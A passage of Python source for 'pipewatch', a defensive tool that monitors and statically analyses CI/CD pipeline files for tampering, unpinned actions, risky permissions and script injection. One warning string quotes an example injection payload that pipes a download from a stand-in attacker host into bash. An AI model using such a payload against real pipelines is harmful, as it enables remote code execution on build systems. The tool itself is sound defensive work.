"""
pipewatch v0.2.0 — Integrity monitoring and static analysis for CI/CD pipelines


Usage:
  pipewatch baseline          # record HEAD as known-good
  pipewatch scan              # file diff + step fingerprints vs baseline
  pipewatch pin-audit         # flag unpinned GitHub Actions references
  pipewatch static            # static analysis — no baseline required
  pipewatch snapshot          # capture runner environment to JSON
  pipewatch env-diff <file>   # diff two runner environment snapshots
  pipewatch audit             # full audit: all checks combined
  pipewatch init-runner       # print runner monitoring step block
"""

from __future__ import annotations

import argparse
import difflib
import hashlib
import hmac as _hmac_mod
import json
import os
import re
import shutil
import subprocess
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import yaml

__version__ = "0.2.0"

_BASELINE_FILE = ".pipewatch_baseline"
_SNAPSHOT_FILE = ".pipewatch_env_snapshot.json"
_SHA_RE = re.compile(r"^[0-9a-f]{40}$|^[0-9a-f]{64}$", re.IGNORECASE)
_STEP_FIELDS = ("uses", "run", "with", "env", "shell")
_TRACKED_TOOLS = [
    "python3", "python", "node", "npm", "pip", "pip3",
    "git", "curl", "wget", "docker", "kubectl", "terraform", "aws", "gcloud", "az",
]
_IGNORE_VARS: frozenset[str] = frozenset({
    "GITHUB_RUN_ID", "GITHUB_RUN_NUMBER", "GITHUB_SHA", "GITHUB_REF",
    "GITHUB_REF_NAME", "GITHUB_REF_TYPE", "GITHUB_HEAD_REF", "GITHUB_BASE_REF",
    "GITHUB_EVENT_NAME", "GITHUB_ACTOR", "GITHUB_ACTION", "GITHUB_JOB",
    "RUNNER_TEMP", "RUNNER_WORKSPACE", "GITHUB_WORKSPACE",
    "HOME", "TMPDIR", "TMP", "TEMP", "PWD", "_", "TERM", "SHLVL", "OLDPWD",
})
# Env var names matching this pattern are excluded from snapshots to prevent
# writing credentials (tokens, keys, passwords) to disk or the cache store.
_CREDENTIAL_VAR_RE = re.compile(
    r"(token|secret|key|password|passwd|pwd|auth|credential|private|api_key)",
    re.IGNORECASE,
)
_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
_ANSI = {
    "HIGH": "\033[91m", "CRITICAL": "\033[91m", "MEDIUM": "\033[93m",
    "LOW": "\033[94m", "INFO": "\033[0m", "RESET": "\033[0m",
}

# Static analysis patterns
_DANGEROUS_CTX = re.compile(
    r"\$\{\{[^}]*("
    r"github\.event\.pull_request\.(title|body|head\.ref|head\.label)"
    r"|github\.event\.issue\.(title|body)"
    r"|github\.event\.comment\.body"
    r"|github\.event\.discussion\.(title|body)"
    r"|github\.event\.review\.body"
    r"|github\.event\.review_comment\.body"
    r"|github\.head_ref"
    r")[^}]*\}\}",
    re.IGNORECASE,
)
_GH_HOSTED = re.compile(r"^(ubuntu|windows|macos)", re.IGNORECASE)
_UNSAFE_TRIGGERS = frozenset({
    "pull_request", "issues", "issue_comment",
    "pull_request_review", "pull_request_review_comment",
})
_GITLAB_RESERVED = frozenset({
    "stages", "variables", "include", "default", "workflow",
    "image", "services", "before_script", "after_script", "cache", "artifacts",
})

# Jenkinsfile patterns (best-effort — Groovy DSL has no Python parser)
_JENKINS_STAGE = re.compile(r"stage\s*\(\s*['\"]([^'\"]+)['\"]\s*\)")
_JENKINS_SH = re.compile(
    r"\b(?:sh|bat)\s+(?:script:\s*)?(?:'''(.*?)'''|\"\"\"(.*?)\"\"\"|'([^']*)'|\"([^\"]*)\")",
    re.DOTALL,
)


# ── pipeline file discovery ───────────────────────────────────────────────────

def find_pipeline_files(repo: Path) -> list[Path]:
    found = []
    for subdir, pat in [(".github/workflows", "*.yml"), (".github/workflows", "*.yaml")]:
        base = repo / subdir
        if base.exists():
            found.extend(base.glob(pat))
    for name in ("Jenkinsfile", ".gitlab-ci.yml", ".gitlab-ci.yaml"):
        p = repo / name
        if p.exists():
            found.append(p)
    return found


def _is_pipeline_path(path: str) -> bool:
    p = Path(path)
    if p.name in ("Jenkinsfile", ".gitlab-ci.yml", ".gitlab-ci.yaml"):
        return True
    return (len(p.parts) >= 3 and p.parts[0] == ".github"
            and p.parts[1] == "workflows" and p.suffix in (".yml", ".yaml"))


# ── git helpers ───────────────────────────────────────────────────────────────

def git_show(repo: Path, commit: str, path: str) -> Optional[str]:
    r = subprocess.run(["git", "show", f"{commit}:{path}"],
                       cwd=repo, capture_output=True, text=True)
    return r.stdout if r.returncode == 0 else None


def git_head(repo: Path) -> str:
    r = subprocess.run(["git", "rev-parse", "HEAD"],
                       cwd=repo, capture_output=True, text=True)
    sha = r.stdout.strip()
    if not sha:
        sys.exit("error: could not determine HEAD commit")
    return sha


def git_deleted_pipeline_files(repo: Path, commit: str) -> list[str]:
    r = subprocess.run(
        ["git", "diff", "--name-status", commit, "HEAD", "--diff-filter=D"],
        cwd=repo, capture_output=True, text=True)
    return [line.split("\t", 1)[1] for line in r.stdout.splitlines()
            if "\t" in line and _is_pipeline_path(line.split("\t", 1)[1])]


# ── differ ────────────────────────────────────────────────────────────────────

@dataclass
class FileDiff:
    path: str
    status: str
    diff_lines: list[str] = field(default_factory=list)
    baseline_commit: Optional[str] = None


def diff_pipeline_files(repo: Path, baseline: str) -> list[FileDiff]:
    results = []
    for fpath in find_pipeline_files(repo):
        rel = str(fpath.relative_to(repo))
        current = fpath.read_text(encoding="utf-8", errors="replace")
        base = git_show(repo, baseline, rel)
        if base is None:
            results.append(FileDiff(rel, "added", list(difflib.unified_diff(
                [], current.splitlines(keepends=True),
                fromfile=f"{rel} (not in baseline)", tofile=f"{rel} (current)")),
                baseline))
        elif base != current:
            results.append(FileDiff(rel, "modified", list(difflib.unified_diff(
                base.splitlines(keepends=True), current.splitlines(keepends=True),
                fromfile=f"{rel} @ {baseline}", tofile=f"{rel} (current)")),
                baseline))
    for path in git_deleted_pipeline_files(repo, baseline):
        results.append(FileDiff(path, "deleted", baseline_commit=baseline))
    return results


# ── step fingerprinting ───────────────────────────────────────────────────────

def hash_step(step: dict) -> str:
    """Hash the security-relevant fields of a GitHub Actions step."""
    canon = json.dumps({k: step[k] for k in _STEP_FIELDS if k in step}, sort_keys=True)
    return hashlib.sha256(canon.encode()).hexdigest()[:16]


def _hash_content(content) -> str:
    """Hash arbitrary content (for GitLab CI / Jenkinsfile where field names vary)."""
    return hashlib.sha256(json.dumps(content, sort_keys=True).encode()).hexdigest()[:16]


def _fingerprints(content: str) -> dict[tuple[str, int], tuple[Optional[str], str]]:
    """GitHub Actions: {(job, step_index): (step_name, fingerprint)}"""
    try:
        doc = yaml.safe_load(content)
    except yaml.YAMLError:
        return {}
    if not isinstance(doc, dict):
        return {}
    out = {}
    for job, job_def in (doc.get("jobs") or {}).items():
        if not isinstance(job_def, dict):
            continue
        for idx, step in enumerate(job_def.get("steps") or []):
            if isinstance(step, dict):
                out[(str(job), idx)] = (step.get("name"), hash_step(step))
    return out


def _fingerprints_gitlab(content: str) -> dict[tuple[str, int], tuple[Optional[str], str]]:
    """GitLab CI: top-level jobs, fingerprint before_script/script/after_script blocks."""
    try:
        doc = yaml.safe_load(content)
    except yaml.YAMLError:
        return {}
    if not isinstance(doc, dict):
        return {}
    out = {}
    for job_name, job_def in doc.items():
        if job_name.startswith(".") or job_name in _GITLAB_RESERVED:
            continue
        if not isinstance(job_def, dict):
            continue
        for idx, block_name in enumerate(("before_script", "script", "after_script")):
            if block_name in job_def:
                out[(str(job_name), idx)] = (
                    block_name,
                    _hash_content(job_def[block_name]),
                )
    return out


def _fingerprints_jenkinsfile(content: str) -> dict[tuple[str, int], tuple[Optional[str], str]]:
    """Jenkinsfile: best-effort regex extraction of stage/sh/bat blocks."""
    out = {}
    stages = list(_JENKINS_STAGE.finditer(content))
    for i, stage_match in enumerate(stages):
        stage_name = stage_match.group(1)
        start = stage_match.start()
        end = stages[i + 1].start() if i + 1 < len(stages) else len(content)
        chunk = content[start:end]
        commands = []
        for m in _JENKINS_SH.finditer(chunk):
            cmd = next((g for g in m.groups() if g is not None), "")
            commands.append(cmd.strip())
        out[(stage_name, 0)] = (stage_name, _hash_content({"run": commands, "stage": stage_name}))
    return out


@dataclass
class StepChange:
    path: str
    job: str
    step_index: int
    step_name: Optional[str]
    baseline_fp: Optional[str]
    current_fp: Optional[str]
    status: str
    step_preview: Optional[str] = None  # human-readable hint: uses/run first line/name


def _preview_step(step: dict) -> str:
    """Return a one-line description of a GitHub Actions step."""
    if not isinstance(step, dict):
        return ""
    if "uses" in step:
        return f"uses={step['uses']}"
    if "run" in step:
        first = next((ln.strip() for ln in str(step["run"]).splitlines() if ln.strip()), "")
        return f"run={(first[:80] + '…') if len(first) > 80 else first}"
    if "name" in step:
        return f"name={step['name']}"
    return ""


def _preview_gitlab_block(doc: dict, job: str, block_idx: int) -> str:
    """Return first command from a GitLab before_script/script/after_script block."""
    block_name = ("before_script", "script", "after_script")[block_idx]
    job_def = doc.get(job, {})
    if not isinstance(job_def, dict):
        return ""
    cmds = job_def.get(block_name, [])
    if isinstance(cmds, list) and cmds:
        first = str(cmds[0]).strip()
        return f"{block_name}={(first[:80] + '…') if len(first) > 80 else first}"
    return block_name


def _preview_jenkins_stage(content: str, stage_name: str) -> str:
    """Return first sh/bat command from a Jenkinsfile stage (best-effort, regex-based)."""
    stages = list(_JENKINS_STAGE.finditer(content))
    for i, m in enumerate(stages):
        if m.group(1) != stage_name:
            continue
        start = m.start()
        end = stages[i + 1].start() if i + 1 < len(stages) else len(content)
        sh_match = _JENKINS_SH.search(content[start:end])
        if sh_match:
            cmd = next((g for g in sh_match.groups() if g is not None), "").strip()
            if cmd:
                return f"sh={(cmd[:80] + '…') if len(cmd) > 80 else cmd}"
        return f"stage={stage_name}"
    return ""


def _fps_for_file(fpath: Path, rel: str, content: str) -> dict:
    if fpath.name == "Jenkinsfile":
        return _fingerprints_jenkinsfile(content)
    if fpath.name in (".gitlab-ci.yml", ".gitlab-ci.yaml"):
        return _fingerprints_gitlab(content)
    return _fingerprints(content)


def diff_fingerprints(repo: Path, baseline: str) -> list[StepChange]:
    changes = []
    for fpath in find_pipeline_files(repo):
        rel = str(fpath.relative_to(repo))
        current_content = fpath.read_text(encoding="utf-8", errors="replace")
        base_content = git_show(repo, baseline, rel)
        cur = _fps_for_file(fpath, rel, current_content)
        bas = _fps_for_file(fpath, rel, base_content) if base_content else {}

        is_jenkins = fpath.name == "Jenkinsfile"
        is_gitlab = fpath.name in (".gitlab-ci.yml", ".gitlab-ci.yaml")

        try:
            cur_doc = {} if is_jenkins else (yaml.safe_load(current_content) or {})
        except yaml.YAMLError:
            cur_doc = {}

        def _get_preview(job_name: str, step_idx: int) -> str:
            if is_jenkins:
                return _preview_jenkins_stage(current_content, job_name)
            if is_gitlab:
                return _preview_gitlab_block(cur_doc, job_name, step_idx)
            steps = (cur_doc.get("jobs") or {}).get(job_name, {}).get("steps") or []
            step = steps[step_idx] if isinstance(steps, list) and step_idx < len(steps) else {}
            return _preview_step(step)

        for key in sorted(set(cur) | set(bas)):
            c, b = cur.get(key), bas.get(key)
            job_name, step_idx = key
            preview = _get_preview(job_name, step_idx)
            if b is None:
                changes.append(StepChange(rel, job_name, step_idx, c[0] if c else None,
                                          None, c[1] if c else None, "added", preview))
            elif c is None:
                changes.append(StepChange(rel, job_name, step_idx, b[0], b[1], None,
                                          "removed", preview))
            elif c[1] != b[1]:
                changes.append(StepChange(rel, job_name, step_idx, c[0], b[1], c[1],
                                          "modified", preview))
    return changes


# ── static analysis ───────────────────────────────────────────────────────────

def _load_workflow_docs(repo: Path) -> dict[str, dict]:
    """Load all GitHub Actions workflow files → {rel_path: parsed_doc}

    Both glob patterns are collected before iterating so that a file with an
    unusual double extension (if it ever appeared) would simply overwrite its
    first entry — the last parse wins, which is fine for our purposes.
    A file can only match one extension pattern, so duplicates cannot arise in
    practice; the combined list is safe to iterate without a duplicate guard.
    """
    docs = {}
    wf_dir = repo / ".github" / "workflows"
    if not wf_dir.exists():
        return docs
    for fpath in list(wf_dir.glob("*.yml")) + list(wf_dir.glob("*.yaml")):
        rel = str(fpath.relative_to(repo))
        try:
            doc = yaml.safe_load(fpath.read_text(encoding="utf-8", errors="replace"))
            if isinstance(doc, dict):
                docs[rel] = doc
        except (yaml.YAMLError, OSError):
            continue
    return docs


def _get_triggers(doc: dict) -> dict:
    """Parse `on:` block — PyYAML parses the bare `on` key as boolean True."""
    on = doc.get("on") or doc.get(True) or {}
    if isinstance(on, str):
        return {on: {}}
    if isinstance(on, list):
        return {t: {} for t in on}
    return on if isinstance(on, dict) else {}


def _check_pr_target_misuse(docs: dict[str, dict]) -> list[dict]:
    """Flag pull_request_target workflows that check out and execute PR head code."""
    findings = []
    # Anchor with $ so this doesn't match actions/checkout-something-else.
    checkout_re = re.compile(r"actions/checkout(@[^@]+)?$")
    pr_head_re = re.compile(r"github\.event\.pull_request\.head|github\.head_ref", re.IGNORECASE)
    for path, doc in docs.items():
        if "pull_request_target" not in _get_triggers(doc):
            continue
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            for idx, step in enumerate(job_def.get("steps") or []):
                if not isinstance(step, dict):
                    continue
                if not checkout_re.match(step.get("uses", "")):
                    continue
                with_block = json.dumps(step.get("with") or {})
                if pr_head_re.search(with_block):
                    findings.append(_finding(
                        f"PW-PRT-{len(findings)+1:03d}", "HIGH",
                        "pull_request_target_misuse",
                        f"pull_request_target checks out PR head: {path}::{job_name}::step[{idx}]",
                        "pull_request_target runs with write permissions against the base branch. "
                        "Checking out and executing PR head code hands arbitrary code execution to "
                        "the PR author — this is the pattern behind numerous CI poisoning attacks.",
                        f"{path}::{job_name}::step[{idx}]",
                        f"uses={step.get('uses')}  with={with_block[:120]}",
                    ))
    return findings


def _check_script_injection(docs: dict[str, dict]) -> list[dict]:
    """Flag run: blocks and env: blocks that route untrusted user-controlled context values
    into shell commands.  The env: vector is classic: set an env var from a user-controlled
    context value, then expand $VAR inside the run: block — no ${{ }} in the run: block
    itself, but still fully attacker-controlled.
    """
    findings = []
    for path, doc in docs.items():
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            for idx, step in enumerate(job_def.get("steps") or []):
                if not isinstance(step, dict):
                    continue

                # Check run: block for direct context interpolation.
                run_matches: list = []
                if "run" in step:
                    run_matches = _DANGEROUS_CTX.findall(str(step["run"]))

                # Check env: block — user-controlled value bound to an env var
                # that the run: block may then expand via $VAR / %VAR%.
                env_matches: list = []
                env_block = step.get("env")
                if isinstance(env_block, dict):
                    env_matches = _DANGEROUS_CTX.findall(json.dumps(env_block))

                all_matches = run_matches + env_matches
                if not all_matches:
                    continue

                sources = sorted(set(
                    m[0] if isinstance(m, tuple) else m for m in all_matches
                ))
                vectors = []
                if run_matches:
                    vectors.append("run:")
                if env_matches:
                    vectors.append("env: (routed to shell via environment variable)")

                findings.append(_finding(
                    f"PW-INJ-{len(findings)+1:03d}", "HIGH",
                    "script_injection",
                    f"Script injection risk: {path}::{job_name}::step[{idx}]",
                    "A user-controlled context value is interpolated into a shell command "
                    "(directly in run: or via an env: variable). An attacker can craft a "
                    "PR title, issue body, or branch name containing "
                    "`; curl evil.com | bash` to execute arbitrary code. "
                    f"Injection vector(s): {', '.join(vectors)}",
                    f"{path}::{job_name}::step[{idx}]",
                    f"dangerous expressions found: {sources}",
                ))
    return findings


def _check_permissions(docs: dict[str, dict]) -> list[dict]:
    """Audit top-level and per-job permissions blocks."""
    findings = []
    for path, doc in docs.items():
        top_perms = doc.get("permissions")
        if top_perms is None:
            findings.append(_finding(
                f"PW-PERM-{len(findings)+1:03d}", "MEDIUM",
                "permissions",
                f"No permissions block: {path}",
                "Without an explicit permissions block the workflow inherits the repository's "
                "default — which may grant write access to all scopes. "
                "Declare the minimum required permissions explicitly.",
                path,
                "add: permissions: read-all  (or scope each permission individually)",
            ))
        elif top_perms == "write-all":
            findings.append(_finding(
                f"PW-PERM-{len(findings)+1:03d}", "HIGH",
                "permissions",
                f"permissions: write-all in {path}",
                "write-all grants write access to every scope. "
                "Scope permissions to the minimum each job actually needs.",
                path,
            ))
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            job_perms = job_def.get("permissions")
            if job_perms == "write-all":
                findings.append(_finding(
                    f"PW-PERM-{len(findings)+1:03d}", "HIGH",
                    "permissions",
                    f"Job permissions: write-all in {path}::{job_name}",
                    f"Job '{job_name}' has permissions: write-all.",
                    f"{path}::{job_name}",
                ))
            elif isinstance(job_perms, dict):
                write_scopes = [k for k, v in job_perms.items() if v in ("write", "admin")]
                if write_scopes:
                    findings.append(_finding(
                        f"PW-PERM-{len(findings)+1:03d}", "HIGH",
                        "permissions",
                        f"Job has write-scoped permissions: {path}::{job_name}",
                        f"Job '{job_name}' grants write access to: {write_scopes}. "
                        "Scope each permission to the minimum the job actually needs.",
                        f"{path}::{job_name}",
                        f"write scopes: {write_scopes}",
                    ))
            if job_def.get("secrets") == "inherit":
                findings.append(_finding(
                    f"PW-PERM-{len(findings)+1:03d}", "MEDIUM",
                    "permissions",
                    f"secrets: inherit in {path}::{job_name}",
                    f"Job '{job_name}' passes all secrets to a called workflow. "
                    "Pass only the specific secrets each called workflow needs.",
                    f"{path}::{job_name}",
                ))
    return findings


def _check_self_hosted(docs: dict[str, dict]) -> list[dict]:
    """Flag jobs running on self-hosted runners."""
    _EXPR_RE = re.compile(r"\$\{\{")  # expression syntax — can't be statically resolved

    findings = []
    for path, doc in docs.items():
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            runs_on = job_def.get("runs-on", "")
            is_self_hosted = False
            if isinstance(runs_on, list):
                # Skip lists that contain expression elements — matrix builds,
                # dynamic runner selection, etc. can't be resolved statically.
                if any(_EXPR_RE.search(str(r)) for r in runs_on):
                    continue
                is_self_hosted = "self-hosted" in runs_on or any(
                    not _GH_HOSTED.match(str(r)) for r in runs_on if isinstance(r, str)
                )
            elif isinstance(runs_on, str) and runs_on:
                # Skip expression-based values like ${{ matrix.os }} or ${{ inputs.runner }}.
                if _EXPR_RE.search(runs_on):
                    continue
                is_self_hosted = not _GH_HOSTED.match(runs_on)
            if is_self_hosted:
                findings.append(_finding(
                    f"PW-RUNNER-{len(findings)+1:03d}", "INFO",
                    "self_hosted_runner",
                    f"Self-hosted runner: {path}::{job_name}",
                    f"Job '{job_name}' runs on '{runs_on}'. Self-hosted runners are not ephemeral, "
                    "not managed by GitHub, and may persist state between runs. "
                    "All other findings in this job carry elevated risk.",
                    f"{path}::{job_name}",
                    f"runs-on: {runs_on}",
                ))
    return findings


def _check_workflow_run_chains(docs: dict[str, dict]) -> list[dict]:
    """Flag workflow_run triggers that chain write-permissioned workflows to unsafe sources."""
    findings = []
    # Map workflow name (or filename stem) → set of trigger names
    name_to_triggers: dict[str, set[str]] = {}
    for path, doc in docs.items():
        triggers = set(_get_triggers(doc).keys())
        name = doc.get("name") or Path(path).stem
        name_to_triggers[name] = triggers
        name_to_triggers[path] = triggers  # also index by path

    for path, doc in docs.items():
        triggers = _get_triggers(doc)
        if "workflow_run" not in triggers:
            continue
        wr_config = triggers.get("workflow_run") or {}
        triggered_by = wr_config.get("workflows", []) if isinstance(wr_config, dict) else []

        def _perms_has_write(perms) -> bool:
            return (
                perms == "write-all"
                or (isinstance(perms, dict)
                    and any(v in ("write", "admin") for v in perms.values()))
            )

        top_perms = doc.get("permissions")
        workflow_has_write = _perms_has_write(top_perms)

        # Collect job names that have write access — either inherited from a
        # write-permissioned top-level block or explicitly set at the job level.
        write_jobs: list[str] = []
        for job_name, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            job_perms = job_def.get("permissions")
            if job_perms is None:
                # Inherits top-level — flagged if top-level is write
                if workflow_has_write:
                    write_jobs.append(job_name)
            elif _perms_has_write(job_perms):
                write_jobs.append(job_name)

        has_write = bool(write_jobs) or (workflow_has_write and not doc.get("jobs"))

        for source_name in triggered_by:
            source_triggers = name_to_triggers.get(source_name, set())
            unsafe = source_triggers & _UNSAFE_TRIGGERS
            if unsafe and has_write:
                findings.append(_finding(
                    f"PW-CHAIN-{len(findings)+1:03d}", "HIGH",
                    "workflow_run_chain",
                    f"Unsafe workflow_run chain: {path}",
                    f"'{path}' runs on workflow_run triggered by '{source_name}', "
                    f"which responds to {sorted(unsafe)}. "
                    "This workflow has write permissions, creating a privilege escalation path: "
                    "a PR from an untrusted fork can indirectly trigger write-permissioned code.",
                    path,
                    f"source={source_name}  source_triggers={sorted(unsafe)}  "
                    f"write_jobs={write_jobs or ['(top-level)']}",
                ))
    return findings


def static_analysis(repo: Path) -> list[dict]:
    """Run all static checks that don't require a baseline commit."""
    docs = _load_workflow_docs(repo)
    return (
        _check_pr_target_misuse(docs)
        + _check_script_injection(docs)
        + _check_permissions(docs)
        + _check_self_hosted(docs)
        + _check_workflow_run_chains(docs)
    )


# ── pinning audit ─────────────────────────────────────────────────────────────

@dataclass
class PinningFinding:
    path: str
    job: str
    step_index: int
    step_name: Optional[str]
    uses_ref: str
    recommendation: str


def _is_sha_pinned(ref: str) -> bool:
    _, _, pin = ref.rpartition("@")
    return bool(_SHA_RE.match(pin))


def audit_pinning(repo: Path) -> list[PinningFinding]:
    findings = []
    for fpath in find_pipeline_files(repo):
        if fpath.suffix not in (".yml", ".yaml"):
            continue
        rel = str(fpath.relative_to(repo))
        try:
            doc = yaml.safe_load(fpath.read_text(encoding="utf-8", errors="replace"))
        except (yaml.YAMLError, OSError):
            continue
        if not isinstance(doc, dict):
            continue
        for job, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            for idx, step in enumerate(job_def.get("steps") or []):
                if not isinstance(step, dict) or "uses" not in step:
                    continue
                ref: str = step["uses"]
                if ref.startswith("./") or ("@" in ref and _is_sha_pinned(ref)):
                    continue
                action = ref.split("@")[0] if "@" in ref else ref
                tag = ref.split("@")[1] if "@" in ref else "unversioned"
                findings.append(PinningFinding(
                    rel, str(job), idx, step.get("name"), ref,
                    f"uses: {action}@<sha>  # {tag}\n"
                    f"  https://github.com/{action}/commits",
                ))
    return findings


def _verify_commit_exists(owner: str, repo_name: str, sha: str, token: Optional[str]) -> bool:
    """Return False only if GitHub's API returns 404 for this commit."""
    url = f"https://api.github.com/repos/{owner}/{repo_name}/git/commits/{sha}"
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": f"pipewatch/{__version__}",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as e:
        return e.code != 404
    except Exception:
        return True  # network unavailable — don't raise false positives


def verify_pinned_shas(repo: Path, token: Optional[str] = None) -> list[dict]:
    """
    For each SHA-pinned action, verify the commit exists in that repo via GitHub API.
    Opt-in: pass --verify-shas. Rate limit: 60 req/hr unauthenticated, 5000 with --token.

    API calls are deduplicated (one call per unique owner/repo+SHA pair), but a finding
    is emitted for *every* affected step so callers see the full blast radius of a
    compromised or deleted commit.
    """
    findings = []
    # Cache API results: (owner/repo, sha) → bool (True = exists / inconclusive)
    verified: dict[tuple[str, str], bool] = {}

    for fpath in find_pipeline_files(repo):
        if fpath.suffix not in (".yml", ".yaml"):
            continue
        try:
            doc = yaml.safe_load(fpath.read_text(encoding="utf-8", errors="replace"))
        except (yaml.YAMLError, OSError):
            continue
        if not isinstance(doc, dict):
            continue

        rel = str(fpath.relative_to(repo))
        for job, job_def in (doc.get("jobs") or {}).items():
            if not isinstance(job_def, dict):
                continue
            for idx, step in enumerate(job_def.get("steps") or []):
                if not isinstance(step, dict) or "uses" not in step:
                    continue
                ref: str = step["uses"]
                if ref.startswith("./") or "@" not in ref or not _is_sha_pinned(ref):
                    continue
                action, _, sha = ref.rpartition("@")
                parts = action.split("/")
                if len(parts) < 2:
                    continue
                owner, repo_name = parts[0], parts[1]
                key = (f"{owner}/{repo_name}", sha)
                if key not in verified:
                    verified[key] = _verify_commit_exists(owner, repo_name, sha, token)
                if not verified[key]:
                    findings.append(_finding(
                        f"PW-SHA-{len(findings)+1:03d}", "HIGH",
                        "invalid_pinned_sha",
                        f"Pinned SHA not found in repo: {ref}",
                        f"Commit {sha[:8]}... does not exist in {owner}/{repo_name}. "
                        "This may be a typo, a SHA from a fork, or a deleted commit.",
                        f"{rel}::{job}::step[{idx}]",
                        f"checked: GET /repos/{owner}/{repo_name}/git/commits/{sha}",
                    ))
    return findings


# ── runner environment ────────────────────────────────────────────────────────

@dataclass
class EnvSnapshot:
    timestamp: str
    environment: dict[str, str]
    tool_versions: dict[str, Optional[str]]


@dataclass
class EnvDiff:
    new_vars: dict[str, str] = field(default_factory=dict)
    removed_vars: list[str] = field(default_factory=list)
    changed_vars: dict[str, tuple[str, str]] = field(default_factory=dict)
    new_tools: list[str] = field(default_factory=list)
    removed_tools: list[str] = field(default_factory=list)
    changed_tool_versions: dict[str, tuple[Optional[str], Optional[str]]] = field(default_factory=dict)

    def is_empty(self) -> bool:
        return not any([self.new_vars, self.removed_vars, self.changed_vars,
                        self.new_tools, self.removed_tools, self.changed_tool_versions])


def _tool_version(tool: str) -> Optional[str]:
    if not shutil.which(tool):
        return None
    try:
        r = subprocess.run([tool, "--version"], capture_output=True, text=True, timeout=5)
        return (r.stdout or r.stderr or "").splitlines()[0].strip()[:120]
    except Exception:
        return "(present — version unavailable)"


def capture_snapshot() -> EnvSnapshot:
    return EnvSnapshot(
        timestamp=datetime.now(timezone.utc).isoformat(),
        environment={
            k: v for k, v in os.environ.items()
            if k not in _IGNORE_VARS and not _CREDENTIAL_VAR_RE.search(k)
        },
        tool_versions={t: _tool_version(t) for t in _TRACKED_TOOLS},
    )


def save_snapshot(snap: EnvSnapshot, path: Path) -> None:
    path.write_text(json.dumps({"timestamp": snap.timestamp,
                                "environment": snap.environment,
                                "tool_versions": snap.tool_versions}, indent=2))


def load_snapshot(path: Path) -> EnvSnapshot:
    d = json.loads(path.read_text())
    return EnvSnapshot(d["timestamp"], d["environment"], d["tool_versions"])


def diff_snapshots(base: EnvSnapshot, cur: EnvSnapshot) -> EnvDiff:
    diff = EnvDiff()
    for k, v in cur.environment.items():
        if k not in base.environment:
            diff.new_vars[k] = v
        elif base.environment[k] != v:
            diff.changed_vars[k] = (base.environment[k], v)
    diff.removed_vars = [k for k in base.environment if k not in cur.environment]
    for tool in _TRACKED_TOOLS:
        old, new = base.tool_versions.get(tool), cur.tool_versions.get(tool)
        if old is None and new is not None:
            diff.new_tools.append(tool)
        elif old is not None and new is None:
            diff.removed_tools.append(tool)
        elif old != new and old is not None:
            diff.changed_tool_versions[tool] = (old, new)
    return diff


# ── tamper-evident baseline ───────────────────────────────────────────────────

def _hmac_sign(commit: str, timestamp: str, key: str) -> str:
    """Sign commit+timestamp together so replaying an older valid baseline is detected."""
    msg = f"{commit}\n{timestamp}".encode()
    return _hmac_mod.new(key.encode(), msg, hashlib.sha256).hexdigest()


def _hmac_verify(commit: str, timestamp: str, signature: str, key: str) -> bool:
    return _hmac_mod.compare_digest(_hmac_sign(commit, timestamp, key), signature)


def save_baseline(repo: Path, commit: str) -> None:
    key = os.environ.get("PIPEWATCH_HMAC_KEY")
    if key:
        ts = datetime.now(timezone.utc).isoformat()
        data = {
            "commit": commit,
            "timestamp": ts,
            "hmac": _hmac_sign(commit, ts, key),
        }
        (repo / _BASELINE_FILE).write_text(json.dumps(data) + "\n", encoding="utf-8")
    else:
        (repo / _BASELINE_FILE).write_text(commit + "\n", encoding="utf-8")


def load_baseline(repo: Path, override: Optional[str]) -> str:
    if override:
        return override
    bf = repo / _BASELINE_FILE
    if not bf.exists():
        sys.exit("error: no baseline set. Run `pipewatch baseline` first.")
    content = bf.read_text().strip()
    try:
        data = json.loads(content)
        commit = data["commit"]
        key = os.environ.get("PIPEWATCH_HMAC_KEY")
        if key:
            ts = data.get("timestamp", "")
            if not _hmac_verify(commit, ts, data.get("hmac", ""), key):
                sys.exit(
                    "error: baseline HMAC verification failed — "
                    "the baseline file may have been tampered with or replayed "
                    "from an older baseline."
                )
        return commit
    except (json.JSONDecodeError, KeyError):
        # Plain-text format (backward compat) — refuse if signing is configured,
        # because an attacker could have replaced a signed JSON baseline with a
        # raw SHA to bypass HMAC verification entirely.
        if os.environ.get("PIPEWATCH_HMAC_KEY"):
            sys.exit(
                "error: PIPEWATCH_HMAC_KEY is set but the baseline file is not in "
                "signed JSON format — refusing to proceed. Re-run `pipewatch baseline` "
                "with the key set to create a fresh signed baseline."
            )
        return content  # unsigned plain-text baseline accepted only when no key is configured


# ── report ────────────────────────────────────────────────────────────────────

def _finding(fid, severity, category, title, description, location, evidence=""):
    return {"id": fid, "severity": severity, "category": category,
            "title": title, "description": description,
            "location": location, "evidence": evidence}


def _findings_from_diffs(diffs: list[FileDiff]) -> list[dict]:
    return [_finding(
        f"PW-DIFF-{i:03d}",
        "HIGH" if d.status in ("modified", "deleted") else "MEDIUM",
        "pipeline_file_change",
        f"Pipeline file {d.status}: {d.path}",
        f"'{d.path}' was {d.status} since baseline {d.baseline_commit}.",
        d.path, "".join(d.diff_lines[:50]),
    ) for i, d in enumerate(diffs, 1)]


def _findings_from_steps(changes: list[StepChange]) -> list[dict]:
    out = []
    for i, c in enumerate(changes, 1):
        loc = f"{c.path}::{c.job}::step[{c.step_index}]"
        preview = f"  {c.step_preview}" if c.step_preview else ""
        if c.status == "modified":
            out.append(_finding(f"PW-STEP-{i:03d}", "HIGH", "step_fingerprint",
                f"Step fingerprint changed: {loc}",
                f"Step {c.step_index} in '{c.job}' changed — possible injected command or swapped action.",
